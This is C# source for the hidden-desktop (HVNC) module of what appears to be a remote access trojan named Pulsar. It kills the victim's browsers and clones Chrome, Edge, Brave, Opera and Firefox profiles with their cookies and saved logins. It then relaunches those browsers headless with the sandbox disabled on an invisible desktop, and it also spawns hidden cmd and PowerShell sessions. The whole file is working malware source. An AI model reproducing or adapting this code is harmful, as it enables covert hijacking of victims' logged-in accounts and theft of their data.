using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

namespace Pulsar.Client.Helper.HVNC
{
    public class ProcessController
    {
        public ProcessController(string DesktopName)
        {
            this.DesktopName = DesktopName;
        }

        [DllImport("kernel32.dll")]
        private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);

        private void CloneDirectory(string sourceDir, string destinationDir)
        {
            DirectoryInfo directoryInfo = new DirectoryInfo(sourceDir);
            if (!directoryInfo.Exists)
            {
                throw new DirectoryNotFoundException("Source directory '" + sourceDir + "' does not exist.");
            }
            if (!Directory.Exists(destinationDir))
            {
                Directory.CreateDirectory(destinationDir);
            }

            Parallel.ForEach(directoryInfo.GetFiles(), fileInfo =>
            {
                string destFileName = Path.Combine(destinationDir, fileInfo.Name);
                try
                {
                    fileInfo.CopyTo(destFileName, false);
                }
                catch (IOException ex)
                {
                    Console.WriteLine("Could not copy file '" + fileInfo.FullName + "': " + ex.Message);
                }
            });

            Parallel.ForEach(directoryInfo.GetDirectories(), directoryInfo2 =>
            {
                string destinationDir2 = Path.Combine(destinationDir, directoryInfo2.Name);
                this.CloneDirectory(directoryInfo2.FullName, destinationDir2);
            });
        }

        private static bool DeleteFolder(string folderPath)
        {
            bool result;
            try
            {
                if (Directory.Exists(folderPath))
                {
                    Directory.Delete(folderPath, true);
                    result = true;
                }
                else
                {
                    Console.WriteLine("Folder does not exist.");
                    result = false;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error deleting folder: " + ex.Message);
                result = false;
            }
            return result;
        }

        public void StartCmd()
        {
            string path = "conhost cmd.exe";
            this.CreateProc(path);
        }

        public void StartPowershell()
        {
            string path = "conhost powershell.exe";
            this.CreateProc(path);
        }

        public void StartGeneric(string path)
        {
            string command = "conhost " + path;
            this.CreateProc(command);
        }

        public void StartFirefox()
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Mozilla\\Firefox\\";
            if (!Directory.Exists(path)) return;

            string sourceDir = Path.Combine(path, "Profiles");
            if (!Directory.Exists(sourceDir)) return;

            string secureFolder = Path.Combine(path, "SecureFolder");
            string killCommand = "Conhost --headless cmd.exe /c taskkill /IM firefox.exe /F";

            bool needsClone = false;

            if (!Directory.Exists(secureFolder))
            {
                this.CreateProc(killCommand);
                Directory.CreateDirectory(secureFolder);
                needsClone = true;
            }
            else
            {
                DeleteFolder(secureFolder);
                Directory.CreateDirectory(secureFolder);
                needsClone = true;
            }

            if (needsClone)
            {
                try
                {
                    this.CloneDirectory(sourceDir, secureFolder);
                }
                catch (Exception ex)
                {
                    Debug.WriteLine("Failed to clone Firefox profile: " + ex.Message);
                }
            }

            string startCommand = "Conhost --headless cmd.exe /c start firefox -new-window -safe-mode -no-remote -profile \"" + secureFolder + "\"";
            this.CreateProc(startCommand);
        }

        public void StartBrave()
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\";
            if (!Directory.Exists(path)) return;

            string sourceDir = Path.Combine(path, "User Data");
            if (!Directory.Exists(sourceDir)) return;

            string secureFolder = Path.Combine(path, "SecureFolder");
            string killCommand = "Conhost --headless cmd.exe /c taskkill /IM brave.exe /F";

            bool needsClone = false;

            if (!Directory.Exists(secureFolder))
            {
                this.CreateProc(killCommand);
                Directory.CreateDirectory(secureFolder);
                needsClone = true;
            }
            else
            {

                DeleteFolder(secureFolder);
                Directory.CreateDirectory(secureFolder);
                needsClone = true;
            }

            if (needsClone)
            {
                try
                {
                    this.CloneDirectory(sourceDir, secureFolder);
                }
                catch (Exception ex)
                {
                    Debug.WriteLine("Failed to clone Brave profile: " + ex.Message);
                }
            }

            string startCommand = "Conhost --headless cmd.exe /c start brave.exe --start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir=" + secureFolder;
            this.CreateProc(startCommand);
        }

        public void StartOpera()
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\";
            if (!Directory.Exists(path)) return;

            string sourceDir = path;
            string secureFolder = Path.Combine(Path.GetDirectoryName(path), "SecureFolder");
            string killCommand = "Conhost --headless cmd.exe /c taskkill /IM opera.exe /F";

            bool needsClone = false;

            if (!Directory.Exists(secureFolder))
            {
                this.CreateProc(killCommand);
                Directory.CreateDirectory(secureFolder);
                needsClone = true;
            }
            else
            {
                DeleteFolder(secureFolder);
                Directory.CreateDirectory(secureFolder);
                needsClone = true;
            }

            if (needsClone)
            {
                try
                {
                    this.CloneDirectory(sourceDir, secureFolder);
                }
                catch (Exception ex)
                {
                    Debug.WriteLine("Failed to clone Opera profile: " + ex.Message);
                }
            }

            string startCommand = "Conhost --headless cmd.exe /c start opera.exe --user-data-dir=\"" + secureFolder + "\"";
            this.CreateProc(startCommand);
        }

        public void StartEdge()
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\";

            if (!Directory.Exists(path))
            {
                return;
            }

            string sourceDir = Path.Combine(path, "User Data");

            if (!Directory.Exists(sourceDir))
            {
                return;
            }

            string text = Path.Combine(path, "SecureFolder");
            string filePath = "Conhost --headless cmd.exe /c taskkill /IM msedge.exe /F";
            if (!Directory.Exists(text))
            {
                this.CreateProc(filePath);
                Directory.CreateDirectory(text);
                this.CloneDirectory(sourceDir, text);
            }
            else
            {
                DeleteFolder(text);
                this.StartEdge();
            }
            string filePath2 = "Conhost --headless cmd.exe /c start msedge.exe --start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir=" + text;
            this.CreateProc(filePath2);
        }

        public void Startchrome()
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\";
            if (!Directory.Exists(path)) return;

            string sourceDir = Path.Combine(path, "User Data");
            if (!Directory.Exists(sourceDir)) return;

            string secureFolder = Path.Combine(path, "SecureFolder");
            string killCommand = "Conhost --headless cmd.exe /c taskkill /IM chrome.exe /F";

            bool needsClone = false;

            if (!Directory.Exists(secureFolder))
            {
                this.CreateProc(killCommand);
                Directory.CreateDirectory(secureFolder);
                needsClone = true;
            }
            else
            {
                DeleteFolder(secureFolder);
                Directory.CreateDirectory(secureFolder);
                needsClone = true;
            }

            if (needsClone)
            {
                try
                {
                    this.CloneDirectory(sourceDir, secureFolder);
                }
                catch (Exception ex)
                {
                    Debug.WriteLine("Failed to clone Chrome profile: " + ex.Message);
                }
            }

            string startCommand = "Conhost --headless cmd.exe /c start chrome.exe --start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir=" + secureFolder;
            this.CreateProc(startCommand);
        }

        public void StartDiscord()
        {
            string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Discord\\Update.exe";
            if (!File.Exists(discordPath)) return;

            string killCommand = "Conhost --headless cmd.exe /c taskkill /IM discord.exe /F";
            this.CreateProc(killCommand);

            string startCommand = "\"" + discordPath + "\" --processStart Discord.exe";
            this.CreateProc(startCommand);
        }

        public void StartExplorer()
        {
            uint num = 2U;
            string name = "TaskbarGlomLevel";
            string name2 = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";
            using (RegistryKey registryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(name2, true))
            {
                if (registryKey != null)
                {
                    object value = registryKey.GetValue(name);
                    if (value is uint)
                    {
                        uint num2 = (uint)value;
                        if (num2 != num)
                        {
                            registryKey.SetValue(name, num, RegistryValueKind.DWord);
                        }
                    }
                }
            }
            string explorerPath = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\explorer.exe /NoUACCheck";
            this.CreateProc(explorerPath);
        }

        public bool CloseProc(string filePath)
        {
            STARTUPINFO structure = default(STARTUPINFO);
            structure.cb = Marshal.SizeOf<STARTUPINFO>(structure);
            structure.lpDesktop = this.DesktopName;
            PROCESS_INFORMATION process_INFORMATION = default(PROCESS_INFORMATION);
            return CreateProcess(null, filePath, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref structure, ref process_INFORMATION);
        }

        public bool CreateProc(string filePath)
        {
            STARTUPINFO structure = default(STARTUPINFO);
            structure.cb = Marshal.SizeOf<STARTUPINFO>(structure);
            structure.lpDesktop = this.DesktopName;
            PROCESS_INFORMATION process_INFORMATION = default(PROCESS_INFORMATION);
            return CreateProcess(null, filePath, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref structure, ref process_INFORMATION);
        }

        private string DesktopName;

        private struct STARTUPINFO
        {
            public int cb;

            public string lpReserved;

            public string lpDesktop;

            public string lpTitle;

            public int dwX;

            public int dwY;

            public int dwXSize;

            public int dwYSize;

            public int dwXCountChars;

            public int dwYCountChars;

            public int dwFillAttribute;

            public int dwFlags;

            public short wShowWindow;

            public short cbReserved2;

            public IntPtr lpReserved2;

            public IntPtr hStdInput;

            public IntPtr hStdOutput;

            public IntPtr hStdError;
        }

        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;

            public IntPtr hThread;

            public int dwProcessId;

            public int dwThreadId;
        }
    }
}